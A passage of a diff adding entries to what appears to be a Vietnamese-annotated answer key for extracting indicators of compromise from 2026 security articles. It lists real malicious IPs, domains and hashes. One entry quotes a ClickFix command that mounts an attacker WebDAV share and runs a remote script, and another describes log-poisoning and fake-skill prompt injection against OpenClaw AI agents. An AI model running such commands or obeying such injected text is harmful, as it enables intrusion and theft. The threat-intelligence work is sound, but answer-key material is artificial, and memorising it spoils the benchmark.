+        "Phát tán các bộ cài game crack/lậu trên nhiều website giả mạo (hentakugames.com, dodi-repacks.site, artistapirata.fit...) chứa gói RenEngine giả (setup_game_8246.zip).",
+        "Lợi dụng cấu trúc game engine Ren'Py để thực thi __init.py__ và giải mã DLL HijackLoader (cc32290mt.dll), tiếp tục giải mã và tiêm infostealer (Lumma Stealer / ACR Stealer) vào tiến trình hợp lệ.",
+        "Sử dụng kỹ thuật dead-drop resolver qua hồ sơ Steam công khai (https://steamcommunity.com/profiles/76561199822375128) để lấy địa chỉ máy chủ C2 Lumma đang hoạt động.",
+        "Gửi dữ liệu đánh cắp về hệ thống tên miền C2 luân phiên (.live, .run, .digital, .top, .shop, .today)."
+      ]
+    },
+    "annotator_notes": "Đã giữ nguyên URL hồ sơ Steam dead-drop trong danh sách URLs độc hại nhưng loại tên miền gốc steamcommunity.com khỏi danh sách Domains độc hại vì đây là nền tảng hợp pháp bị lạm dụng."
+  },
+  {
+    "index": 14,
+    "article_id": "securelist-8afa4d60",
+    "title": "Divide and conquer: how the new Keenadu backdoor exposed links between major Android botnets",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-02-17",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "110.34.191.81",
+        "110.34.191.82",
+        "67.198.232.4",
+        "67.198.232.187"
+      ],
+      "domains": [
+        "ubkt1x.oss-us-west-1.aliyuncs.com",
+        "m-file-us.oss-us-west-1.aliyuncs.com",
+        "pkg-czu.istaticfiles.com",
+        "pkgu.istaticfiles.com",
+        "app-download.cn-wlcb.ufileos.com",
+        "trends.search-hub.cn",
+        "zcnewy.com",
+        "fbsimg.com",
+        "tmgstatic.com",
+        "gbugreport.com",
+        "aifacecloud.com",
+        "goaimb.com",
+        "proczone.com",
+        "gvvt1.com",
+        "dllpgd.click",
+        "fbgraph.com",
+        "newsroomlabss.com",
+        "sliidee.com",
+        "keepgo123.com",
+        "gsonx.com",
+        "gmsstatic.com",
+        "ytimg2.com",
+        "glogstatic.com",
+        "gstatic2.com",
+        "uscelluliar.com",
+        "playstations.click"
+      ],
+      "urls": [
+        "https://trends.search-hub.cn/vuGs8"
+      ],
+      "md5": [
+        "ca98ae7ab25ce144927a46b7fee6bd21",
+        "4c4ca7a2a25dbe15a4a39c11cfef2fb2",
+        "ad60f46e724d88af6bcacb8c269ac3c1",
+        "912bc4f756f18049b241934f62bfb06c",
+        "f0184f6955479d631ea4b1ea0f38a35d",
+        "3dae1f297098fa9d9d4ee0335f0aeed3",
+        "529632abf8246dfe555153de6ae2a9df",
+        "d840a70f2610b78493c41b1a344b6893",
+        "382764921919868d810a5cf0391ea193",
+        "d07eb2db2621c425bda0f046b736e372",
+        "f53c6ee141df2083e0200a514ba19e32",
+        "3d185f30b00270e7e30fc4e29a68237f",
+        "8900f5737e92a69712481d7a809fcfaa",
+        "caa640824b0e216fab86402b14447953",
+        "bccd56a6b6c9496ff1acd40628edd25e",
+        "c4c0e65a5c56038034555ec4a09d3a37",
+        "cb9f86c02f756fb9afdb2fe1ad0184ee",
+        "f59ad0c8e47228b603efc0ff790d4a0c",
+        "f9b740dd08df6c66009b27c618f1e086",
+        "02c4c7209b82bbed19b962fb61ad2de3",
+        "185220652fbbc266d4fdf3e668c26e59",
+        "36db58957342024f9bc1cdecf2f163d6",
+        "4964743c742bb899527017b8d06d4eaa",
+        "58f282540ab1bd5ccfb632ef0d273654",
+        "59aee75ece46962c4eb09de78edaa3fa",
+        "8d493346cb84fbbfdb5187ae046ab8d3",
+        "9d16a10031cddd222d26fcb5aa88a009",
+        "a191b683a9307276f0fc68a2a9253da1",
+        "65f290dd99f9113592fba90ea10cb9b3",
+        "68990fbc668b3d2cfbefed874bb24711",
+        "6d93fb8897bf94b62a56aca31961756a",
+        "2922df6713f865c9cba3de1fe56849d7",
+        "462a23bc22d06e5662d379b9011d89ff",
+        "5048406d8d0affa80c18f8b1d6d76e21",
+        "7ceccea499cfd3f9f9981104fc05bcbd",
+        "98ff5a3b5f2cdf2e8f58f96d70db2875",
+        "aa5bf06f0cc5a8a3400e90570fb081b0",
+        "dc3d454a7edb683bec75a6a1e28a4877",
+        "07546413bdcb0e28eadead4e2b0db59d",
+        "0c1f61eeebc4176d533b4fc0a36b9d61",
+        "10d8e8765adb1cbe485cb7d7f4df21e4",
+        "11eaf02f41b9c93e9b3189aa39059419",
+        "19df24591b3d76ad3d0a6f548e608a43",
+        "1bfb3edb394d7c018e06ed31c7eea937",
+        "1c52e14095f23132719145cf24a2f9dc",
+        "21846f602bcabccb00de35d994f153c9",
+        "2419583128d7c75e9f0627614c2aa73f",
+        "28e6936302f2d290c2fec63ca647f8a6",
+        "45bf58973111e00e378ee9b7b43b7d2d",
+        "56036c2490e63a3e55df4558f7ecf893",
+        "64947d3a929e1bb860bf748a15dba57c",
+        "69225f41dcae6ddb78a6aa6a3caa82e1",
+        "6df8284a4acee337078a6a62a8b65210",
+        "6f6e14b4449c0518258beb5a40ad7203",
+        "7882796fdae0043153aa75576e5d0b35",
+        "7c3e70937da7721dd1243638b467cff1",
+        "9ddd621daab4c4bc811b7c1990d7e9ea",
+        "a0f775dd99108cb3b76953e25f5cdae4",
+        "b841debc5307afc8a4592ea60d64de14",
+        "c57de69b401eb58c0aad786531c02c28",
+        "ca59e49878bcf2c72b99d15c98323bcd",
+        "d4be9b2b73e565b1181118cb7f44a102",
+        "d9aecc9d4bf1d4b39aa551f3a1bcc6b7",
+        "e9bed47953986f90e814ed5ed25b010c",
+        "0bc94bc4bc4d69705e4f08aaf0e976b3",
+        "1276480838340dcbc699d1f32f30a5e9",
+        "15fb99660dbd52d66f074eaa4cf1366d",
+        "2dca15e9e83bca37817f46b24b00d197",
+        "350313656502388947c7cbcd08dc5a95",
+        "3e36ffda0a946009cb9059b69c6a6f0d",
+        "5b0726d66422f76d8ba4fbb9765c68f6",
+        "68b64bf1dea3eb314ce273923b8df510",
+        "9195454da9e2cb22a3d58dbbf7982be8",
+        "a4a6ff86413b3b2a893627c4cff34399",
+        "b163fa76bde53cd80d727d88b7b1d94f",
+        "ba0a349f177ffb3e398f8c780d911580",
+        "bba23f4b66a0e07f837f2832a8cd3bd4",
+        "d6ebc5526e957866c02c938fc01349ee",
+        "ec7ab99beb846eec4ecee232ac0b3246",
+        "ef119626a3b07f46386e65de312cf151",
+        "fcaeadbee39fddc907a3ae0315d86178"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Cài cắm backdoor Keenadu ngay từ khâu xây dựng firmware Android (chỉnh sửa thư viện hệ thống libandroid_runtime.so) hoặc nhúng vào ứng dụng hệ thống và ứng dụng trên Google Play/kho tải thay thế.",
+        "Truy vấn cấu hình qua HTTP GET tới https://trends.search-hub.cn/vuGs8 (tắt redirect mặc định) và giải mã danh sách C2 từ zcnewy.com cùng cụm domain giả mạo hạ tầng công nghệ (fbsimg.com, ytimg2.com, gmsstatic.com, gstatic2.com...).",
+        "Tải payload giai đoạn tiếp theo từ các CDN bucket trên Aliyun OSS/UFileOS/istaticfiles (ubkt1x.oss-us-west-1.aliyuncs.com, app-download.cn-wlcb.ufileos.com...) để biến thiết bị thành bot gian lận quảng cáo (Nova clicker) hoặc đánh cắp dữ liệu.",
+        "Hạ tầng C2 (67.198.232.4, 67.198.232.187, 110.34.191.81, 110.34.191.82) trùng khớp với các mạng botnet Android lớn như BadBox/Triada."
+      ]
+    },
+    "annotator_notes": "Giữ nguyên tên miền đầy đủ các bucket CDN (ubkt1x.oss-us-west-1.aliyuncs.com, app-download.cn-wlcb.ufileos.com) thay vì domain gốc đám mây aliyuncs.com/ufileos.com; tổng 81 MD5 tệp thực tế (75 trong bảng IOC + 6 trong thân bài) và đã loại 3 chuỗi hex dùng làm key/salt AES (37d9a33d..., ba60d29d..., bbf6e0a9...)."
+  },
+  {
+    "index": 15,
+    "article_id": "thn-4af5852bc769",
+    "title": "Notepad++ Fixes Hijacked Update Mechanism Used to Deliver Targeted Malware",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-02-18",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2025-15556",
+        "CVE-2026-25926"
+      ],
+      "attack_behaviors": [
+        "Chuỗi tấn công chuỗi cung ứng (CVE-2025-15556) do nhóm Lotus Panda thực hiện bằng cách chiếm đoạt lưu lượng cập nhật ở tầng hosting từ 06/2025 đến 12/2025 để phân phối backdoor Chrysalis.",
+        "Lỗ hổng tìm kiếm đường dẫn không an toàn CVE-2026-25926 (CWE-426) trong WinGUp khi khởi chạy explorer.exe không dùng đường dẫn tuyệt đối cho phép chèn và thực thi mã tùy ý nếu kiểm soát được thư mục làm việc.",
+        "Bản vá Notepad++ v8.9.2 bổ sung thiết kế 'double lock' (xác thực chữ ký XML trả về từ update server), gỡ libcurl.dll chống DLL side-loading và khóa các tùy chọn SSL không an toàn."
+      ]
+    },
+    "annotator_notes": "Đã loại notepad-plus-plus.org vì đây là tên miền chính thức của nhà phát triển Notepad++, bài viết chủ yếu công bố bản vá và 2 mã CVE."
+  },
+  {
+    "index": 16,
+    "article_id": "securelist-c5c061a6",
+    "title": "Arkanix Stealer: a C++ & Python infostealer",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-02-19",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "195.246.231.60"
+      ],
+      "domains": [
+        "arkanix.pw",
+        "arkanix.ru"
+      ],
+      "urls": [
+        "https://arkanix.pw/api/session/create",
+        "https://arkanix.pw/stealer.py",
+        "https://arkanix.pw/upload_dropper.py"
+      ],
+      "md5": [
+        "208fa7e01f72a50334f3d7607f6b82bf",
+        "af8fd03c1ec81811acf16d4182f3b5e1",
+        "a3fc46332dcd0a95e336f6927bae8bb7",
+        "3283f8c54a3ddf0bc0d4111cc1f950c0",
+        "752e3eb5a9c295ee285205fb39b67fc4",
+        "c1e4be64f80bc019651f84ef852dfa6c",
+        "a8eeda4ae7db3357ed2ee0d94b963eff",
+        "c0c04df98b7d1ca9e8c08dd1ffbdd16b",
+        "88487ab7a666081721e1dd1999fb9fb2",
+        "d42ba771541893eb047a0e835bd4f84e",
+        "5f71b83ca752cb128b67dbb1832205a4",
+        "e27edcdeb44522a9036f5e4cd23f1f0c",
+        "ea50282fa1269836a7e87eddb10f95f7",
+        "643696a052ea1963e24cfb0531169477",
+        "f5765930205719c2ac9d2e26c3b03d8d",
+        "576de7a075637122f47d02d4288e3dd6",
+        "7888eb4f51413d9382e2b992b667d9f5"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Phát tán Arkanix Stealer (2 phiên bản C++ native và Python tải từ https://arkanix.pw/stealer.py) quảng bá theo mô hình MaaS kèm chương trình giới thiệu trên diễn đàn và máy chủ Discord 'Arkanix'.",
+        "Thực hiện kiểm tra môi trường VPN bằng cách truy vấn API hợp pháp https://ipapi.co/json/ và đăng ký máy nạn nhân qua HTTP POST tới https://arkanix.pw/api/session/create.",
+        "Đánh cắp dữ liệu trình duyệt (cookie, thông tin đăng nhập), tiêm mã vào ví tiền điện tử Exodus/Atomic và gửi về bảng điều khiển C2 arkanix.pw (IP thực 195.246.231.60) / arkanix.ru.",
+        "Mã nguồn dự án có nhiều dấu hiệu được hỗ trợ phát triển bằng LLM (cấu trúc utils.cpp, comment và debug log đặc trưng)."
+      ]
+    },
+    "annotator_notes": "Đã loại 172.67.186.193 vì bài báo nêu rõ đây chỉ là IP proxy của Cloudflare cho arkanix.ru (chỉ giữ 195.246.231.60 là IP máy chủ thật của arkanix.pw); loại dịch vụ ipapi.co hợp pháp và đường dẫn mẫu có biến placeholder (/api/features/{payload_id})."
+  },
+  {
+    "index": 17,
+    "article_id": "thn-d407ebda9a82",
+    "title": "PromptSpy Android Malware Abuses Gemini AI to Automate Recent-Apps Persistence",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-02-19",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "54.67.2.84"
+      ],
+      "domains": [
+        "mgardownload.com",
+        "m-mgarg.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Mã độc Android mang tên PromptSpy lạm dụng trợ lý ảo Google Gemini AI để tự động hóa việc duy trì sự tồn tại (recent-apps persistence) trên thiết bị di động.",
+        "Tận dụng các tính năng giao diện và trợ lý AI để ẩn mình, tự động kích hoạt lại tiến trình mã độc ngay cả khi người dùng cố gắng đóng ứng dụng."
+      ]
+    },
+    "annotator_notes": "Bổ sung IP C2 VNC 54.67.2.84 và 2 tên miền phát tán/giả mạo JPMorgan Argentina (mgardownload.com, m-mgarg.com) từ nội dung báo cáo ESET."
+  },
+  {
+    "index": 18,
+    "article_id": "thn-ca5df16b90a9",
+    "title": "ClawJacked Flaw Lets Malicious Sites Hijack Local OpenClaw AI Agents via WebSocket",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-02-28",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "91.92.242.30"
+      ],
+      "domains": [
+        "openclawcli.vercel.app"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-25593",
+        "CVE-2026-24763",
+        "CVE-2026-25157",
+        "CVE-2026-25475",
+        "CVE-2026-26319",
+        "CVE-2026-26322",
+        "CVE-2026-26329"
+      ],
+      "attack_behaviors": [
+        "Lỗ hổng ClawJacked trong OpenClaw gateway: JavaScript trên trang web độc hại mở kết nối WebSocket cross-origin tới cổng localhost của AI agent.",
+        "Tận dụng cơ chế thiếu rate-limit cho localhost để brute-force mật khẩu gateway, âm thầm tự đăng ký làm thiết bị tin cậy (auto-approved) và chiếm toàn quyền điều khiển AI agent.",
+        "Khai thác lỗ hổng log poisoning trên cổng TCP 18789 để ghi prompt injection gián tiếp vào file nhật ký khi agent tự đọc log xử lý sự cố.",
+        "Chiến dịch phát tán Atomic Stealer (macOS) qua kỹ năng giả mạo trên ClawHub: tệp SKILL.md dẫn agent tới openclawcli.vercel.app chứa lệnh tải stealer từ 91.92.242.30, hoặc tài khoản @liuhui1010 lừa người dùng chạy lệnh Terminal trực tiếp."
+      ]
+    },
+    "annotator_notes": "Giữ subdomain đầy đủ openclawcli.vercel.app (trang chứa lệnh độc hại do kẻ tấn công dựng) thay vì domain gốc vercel.app; tổng hợp đầy đủ 7 CVE được công bố cùng đợt."
+  },
+  {
+    "index": 19,
+    "article_id": "thn-7a97c98a1216",
+    "title": "APT28 Tied to CVE-2026-21513 MSHTML 0-Day Exploited Before Feb 2026 Patch Tuesday",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-03-02",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "wellnesscaremed.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-21513",
+        "CVE-2026-21509"
+      ],
+      "attack_behaviors": [
+        "Nhóm APT28 bị phát hiện đứng sau chiến dịch khai thác lỗ hổng ngày không (0-day) MSHTML mang mã CVE-2026-21513 trước khi bản vá Patch Tuesday tháng 2/2026 được phát hành.",
+        "Sử dụng các tệp tin hoặc trang web giả mạo để kích hoạt lỗi thành phần MSHTML trên hệ điều hành Windows nhằm thực thi mã từ xa."
+      ]
+    },
+    "annotator_notes": "Bổ sung tên miền C2 wellnesscaremed.com (APT28 dùng trong tệp LNK nhúng HTML khai thác CVE-2026-21513) và CVE-2026-21509 được đề cập cùng chuỗi chiến dịch APT28."
+  },
+  {
+    "index": 20,
+    "article_id": "thn-6d76f840e5db",
+    "title": "Coruna iOS Exploit Kit Uses 23 Exploits Across Five Chains Targeting iOS 13–17.2.1",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-03-04",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "cdn.uacounter.com"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2020-27932",
+        "CVE-2020-27950",
+        "CVE-2021-30952",
+        "CVE-2022-48503",
+        "CVE-2023-32409",
+        "CVE-2023-32434",
+        "CVE-2023-38606",
+        "CVE-2023-41974",
+        "CVE-2023-43000",
+        "CVE-2024-23222",
+        "CVE-2024-23225",
+        "CVE-2024-23296"
+      ],
+      "attack_behaviors": [
+        "Triển khai bộ exploit kit Coruna (CryptoWaters) gồm 5 chuỗi khai thác (23 exploit) nhắm vào iOS 13.0–17.2.1 thông qua iFrame ẩn kích thước 0 (group.html / analytics.html) trên các website bị xâm nhập (như cdn.uacounter.com tại Ukraine bởi UNC6353) hoặc web tài chính giả ở Trung Quốc (UNC6691).",
+        "Kiểm tra thiết bị mục tiêu (bỏ qua nếu bật Apple Lockdown Mode hoặc Private Browsing), khai thác WebKit RCE (CVE-2024-23222), vượt ASLR, thoát sandbox Safari và vượt bảo vệ PAC trên Apple Silicon.",
+        "Thả stager PlasmaLoader / PLASMAGRID giải mã mã QR từ ảnh và tải module từ C2 để đánh cắp ví tiền điện tử (MetaMask, Exodus, Bitget Wallet, Base).",
+        "Dùng thuật toán DGA với seed 'lazarus' sinh tên miền 15 ký tự đuôi .xyz làm kênh dự phòng và kiểm tra trạng thái qua Google Public DNS."
+      ]
+    },
+    "annotator_notes": "Đã loại '16.3.116.4' vì đây là chuỗi phiên bản iOS (16.3.1–16.4.0 bị dính số trong bài báo), KHÔNG phải địa chỉ IPv4; trích đủ 12 mã CVE được liệt kê theo tên mã khai thác."
+  },
+  {
+    "index": 21,
+    "article_id": "sec-fc5e100ff1e0",
+    "title": "BeatBanker: A dual‑mode Android Trojan",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-03-10",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "cupomgratisfood.shop",
+        "fud2026.com",
+        "accessor.fud2026.com",
+        "pool.fud2026.com",
+        "pool-proxy.fud2026.com",
+        "aptabase.fud2026.com",
+        "aptabase.khwdji319.xyz",
+        "btmob.xyz",
+        "bt-mob.net"
+      ],
+      "urls": [
+        "https://accessor.fud2026.com/libmine-",
+        "https://fud2026.com/libmine-"
+      ],
+      "md5": [
+        "F6C979198809E13859196B135D21E79B",
+        "D3005BF1D52B40B0B72B3C3B1773336B"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Phát tán qua website giả mạo Google Play Store (cupomgratisfood.shop) lừa nạn nhân tại Brazil tải tệp APK độc hại (mạo danh INSS Reebolso, StarLink).",
+        "Hoạt động chế độ kép: kết hợp trojan ngân hàng nền tảng BTMOB RAT (btmob.xyz, bt-mob.net) và công cụ đào tiền điện tử âm thầm qua proxy đào pool.fud2026.com:9000 / pool-proxy.fud2026.com.",
+        "Lạm dụng Accessibility Services của Android để giả lập thao tác người dùng, thu thập thông tin thiết bị, chụp màn hình và đánh cắp tài khoản ứng dụng tài chính/crypto (như com.binance.dev).",
+        "Kiểm tra IP/quốc gia qua ipapi.is và tải thành phần đào qua URL accessor.fud2026.com/libmine- hoặc fud2026.com/libmine-."
+      ]
+    },
+    "annotator_notes": "Đã loại tên gói ứng dụng Android 'com.binance.dev' (không phải tên miền) và dịch vụ tra cứu IP hợp pháp https://ipapi.is khỏi IOC độc hại."
+  },
+  {
+    "index": 22,
+    "article_id": "thn-797cc9c2d119",
+    "title": "Investigating a New Click-Fix Variant",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-03-13",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "94.156.170.255",
+        "144.31.165.173"
+      ],
+      "domains": [
+        "cloudflare.report",
+        "happyglamper.ro"
+      ],
+      "urls": [
+        "https://94.156.170.255/webdav",
+        "https://94.156.170.255/flowy.zip",
+        "https://cloudflare.report/forever/e/"
+      ],
+      "md5": [],
+      "sha256": [
+        "a390fe045f50a0697b14160132dfa124c7f92d85c18fba07df351c2fcfc11063",
+        "dc95f7c7fb98ec30d3cb03963865a11d1b7b696e34f163b8de45f828b62ec829"
+      ],
+      "cves": [],
+      "attack_behaviors": [
+        "Trang web giả mạo CAPTCHA happyglamper.ro đánh lừa người dùng mở hộp thoại Windows Run (Win+R) chạy lệnh `cmd.exe /c net use Z: https://94.156.170.255/webdav /persistent:no && Z:\\update.cmd`.",
+        "Lợi dụng WebDAV tải tệp nén flowy.zip từ 94.156.170.255 chứa ứng dụng Electron hợp pháp cũ WorkFlowy.exe kèm mã độc trojan hóa trong app.asar và main.js.",
+        "Kết nối tới C2 cloudflare.report/forever/e/ (origin IP 144.31.165.173 tại Frankfurt) để tải và thực thi payload trên nền Electron sạch nhằm qua mặt EDR."
+      ]
+    },
+    "annotator_notes": "Rất quan trọng: Bài báo ghi chú rõ SHA256 `9ee58eb59e337c06429ff3f0afd0ee6886b0644ddd4531305b269e97ad2b8d42` là WorkFlowy.exe hợp pháp phiên bản cũ ('not malicious') nên đã LOẠI khỏi SHA256 độc hại; cũng loại link blog Atos (atos.net/en/lp/cybershield)."
+  },
+  {
+    "index": 23,
+    "article_id": "sec-66e48fcc34ea",
+    "title": "Free real estate: GoPix, the banking Trojan living off your memory",
+    "source_name": "Kaspersky Securelist",
+    "published_date": "2026-03-16",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "paletolife.com",
+        "correioez0ubcfht9i3.lovehomely.com",
+        "correiotwknx9gu315h.lovehomely.com",
+        "webmensagens4bb7.com",
+        "mydigitalrevival.com",
+        "b3d0.com",
+        "4a3d.com",
+        "9de1.com",
+        "ef0h.com",
+        "yogarecap.com"
+      ],
+      "urls": [
+        "https://correioez0ubcfht9i3.lovehomely.com/",
+        "https://correiotwknx9gu315h.lovehomely.com/",
+        "http://webmensagens4bb7.com/",
+        "https://mydigitalrevival.com/get.php",
+        "http://b3d0.com/1/",
+        "http://4a3d.com/1/",
+        "http://9de1.com/1/",
+        "http://ef0h.com/1/",
+        "http://yogarecap.com/1/"
+      ],
+      "md5": [
+        "EB0B4E35A2BA442821E28D617DD2DAA2",
+        "D3A17CB4CDBA724A0021F5076B33A103",
+        "28C314ACC587F1EA5C5666E935DB716C"
+      ],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Phát tán qua bộ cài NSIS và tệp ZIP chứa LNK độc hại nhắm vào người dùng ngân hàng Brazil (lợi dụng hệ thống thanh toán tức thì PIX).",
+        "Thực thi mã độc sống hoàn toàn trong bộ nhớ (fileless/in-memory) tránh ghi payload chính ra ổ đĩa để né phần mềm diệt virus.",
+        "Sử dụng chuỗi 9 URL giai đoạn tải/rút gọn (lovehomely.com, webmensagens4bb7.com, mydigitalrevival.com/get.php, b3d0.com, 4a3d.com, 9de1.com, ef0h.com, yogarecap.com) và giao tiếp C2 paletolife.com."
+      ]
+    },
+    "annotator_notes": "Trong bài gốc Securelist có 1 chuỗi MD5 bị thiếu 1 ký tự hex (C64AE7C50394799CE02E97288A12FFF - 31 ký tự) nên chỉ giữ 3 MD5 hợp lệ; 2 SHA1 chứng chỉ số giả mạo là f110d0bd7f3bd1c7b276dc78154dd21eef953384 và 1b1f85b68e6c9fde709d975a186185c94c0faa51."
+  },
+  {
+    "index": 24,
+    "article_id": "thn-f9ce4af82763",
+    "title": "AI Flaws in Amazon Bedrock, LangSmith, and SGLang Enable Data Exfiltration and RCE",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-03-17",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-25750",
+        "CVE-2026-3059",
+        "CVE-2026-3060",
+        "CVE-2026-3989"
+      ],
+      "attack_behaviors": [
+        "Lỗ hổng LangSmith CVE-2026-25750 cho phép kẻ tấn công lừa người dùng bấm liên kết studio chứa tham số baseUrl độc hại để đánh cắp token xác thực và chiếm tài khoản.",
+        "Chuỗi 3 lỗ hổng RCE nghiêm trọng trên framework suy luận SGLang: CVE-2026-3059 và CVE-2026-3060 (CVSS 9.8, RCE không cần xác thực ở module multimodal), cùng CVE-2026-3989 do gọi pickle.load() không an toàn.",
+        "Điểm yếu cấu hình quyền trong Amazon Bedrock Agents cho phép trích xuất dữ liệu nhạy cảm nếu không cô lập ngữ cảnh phiên."
+      ]
+    },
+    "annotator_notes": "Đã loại smith.langchain.com (dịch vụ LangSmith hợp pháp bị lỗ hổng) và https://attacker-server.com (URL minh họa PoC trong bài báo) vì không phải hạ tầng tấn công thực tế."
+  },
+  {
+    "index": 25,
+    "article_id": "thn-cd94f39112d2",
+    "title": "CISA Warns of Zimbra, SharePoint Flaw Exploits; Cisco Zero-Day Hit in Ransomware Attacks",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-03-19",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2025-66376",
+        "CVE-2026-20963",
+        "CVE-2026-20131",
+        "CVE-2026-20127",
+        "CVE-2022-20775",
+        "CVE-2026-20122",
+        "CVE-2026-20128",
+        "CVE-2026-20133"
+      ],
+      "attack_behaviors": [
+        "CISA đưa CVE-2025-66376 (Stored XSS qua CSS @import trong email HTML của Zimbra Classic UI) và CVE-2026-20963 (Deserialization trong Microsoft SharePoint) vào danh mục KEV do bị khai thác thực tế.",
+        "Chiến dịch Operation GhostMail nhắm vào cơ quan Thủy văn Quốc gia Ukraine (hydro.gov.ua) gửi email HTML chứa JavaScript đánh cắp mật khẩu, token phiên, mã dự phòng 2FA và hộp thư 90 ngày, gửi dữ liệu qua DNS và HTTPS.",
+        "Các lỗ hổng nghiêm trọng trên Cisco Firewall Management (CVE-2026-20131, CVSS 10.0) và Cisco Catalyst SD-WAN (CVE-2026-20127, CVE-2022-20775, CVE-2026-20122, CVE-2026-20128, CVE-2026-20133) bị nhóm ransomware khai thác zero-day."
+      ]
+    },
+    "annotator_notes": "Đã loại hydro.gov.ua vì đây là website của cơ quan nạn nhân (State Hydrographic Service of Ukraine) bị chiến dịch Operation GhostMail nhắm mục tiêu."
+  },
+  {
+    "index": 26,
+    "article_id": "thn-f5d8ece44e74",
+    "title": "DarkSword iOS Exploit Kit Uses 6 Flaws, 3 Zero-Days for Full Device Takeover",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-03-19",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [],
+      "domains": [
+        "snapshare.chat"
+      ],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-20700",
+        "CVE-2025-43529",
+        "CVE-2025-14174",
+        "CVE-2025-31277",
+        "CVE-2025-43510",
+        "CVE-2025-43520"
+      ],
+      "attack_behaviors": [
+        "Bộ công cụ khai thác iOS DarkSword (6 lỗ hổng, gồm 3 zero-day CVE-2026-20700, CVE-2025-43529, CVE-2025-14174) nhắm vào iOS 18.4–18.7 qua tấn công watering hole và trang web giả mạo Snapchat (snapshare.chat).",
+        "Chuỗi khai thác: lỗi bộ nhớ JavaScriptCore JIT (CVE-2025-31277/43529) đạt RCE qua CVE-2026-20700 -> thoát sandbox 2 tầng từ WebContent sang GPU rồi mediaplaybackd (CVE-2025-14174, CVE-2025-43510) -> leo quyền kernel (CVE-2025-43520).",
+        "Phát tán các backdoor JavaScript như GHOSTKNIFE (UNC6748) và GHOSTSABER (PARS Defense) để đánh cắp danh bạ, SMS, ảnh, ví tiền điện tử, lịch sử Telegram/WhatsApp rồi xóa dấu vết và thoát nhanh."
+      ]
+    },
+    "annotator_notes": "Tổng hợp đủ 6 mã CVE thuộc chuỗi DarkSword và tên miền phát tán snapshare.chat nhắm vào người dùng Ả Rập Xê Út."
+  },
+  {
+    "index": 27,
+    "article_id": "thn-74a026e325e0",
+    "title": "TeamPCP Hacks Checkmarx GitHub Actions Using Stolen CI Credentials",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-03-24",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "83.142.209.11"
+      ],
+      "domains": [
+        "checkmarx.zone",
+        "scan.aquasecurity.org"
+      ],
+      "urls": [
+        "https://checkmarx.zone/raw"
+      ],
+      "md5": [],
+      "sha256": [],
+      "cves": [
+        "CVE-2026-33634"
+      ],
+      "attack_behaviors": [
+        "Nhóm tấn công TeamPCP đột nhập vào hệ thống GitHub Actions của Checkmarx bằng cách sử dụng thông tin xác thực CI (Continuous Integration) bị đánh cắp.",
+        "Can thiệp vào các quy trình tự động hóa build/deploy để tiêm mã độc hoặc thao túng chuỗi cung ứng phần mềm của tổ chức mục tiêu."
+      ]
+    },
+    "annotator_notes": "Bổ sung đầy đủ IP exfil 83.142.209.11, hai domain typosquat của TeamPCP (checkmarx.zone, scan.aquasecurity.org), URL polling https://checkmarx.zone/raw và CVE-2026-33634 (Trivy supply chain)."
+  },
+  {
+    "index": 28,
+    "article_id": "thn-e2adc66b0ab3",
+    "title": "Device Code Phishing Hits 340+ Microsoft 365 Orgs Across Five Countries via OAuth Abuse",
+    "source_name": "TheHackerNews",
+    "published_date": "2026-03-25",
+    "annotation_status": "done",
+    "ground_truth": {
+      "ips": [
+        "162.220.234.41",
+        "162.220.234.66",
+        "162.220.232.57",
+        "162.220.232.99",
+        "162.220.232.235"
+      ],
+      "domains": [],
+      "urls": [],
+      "md5": [],
+      "sha256": [],
+      "cves": [],
+      "attack_behaviors": [
+        "Chiến dịch lừa đảo EvilTokens PhaaS qua Telegram nhắm hơn 340 tổ chức Microsoft 365, bọc liên kết lừa đảo qua các open-redirect của Cisco/Trend Micro/Mimecast và Cloudflare Workers để né bộ lọc email.",
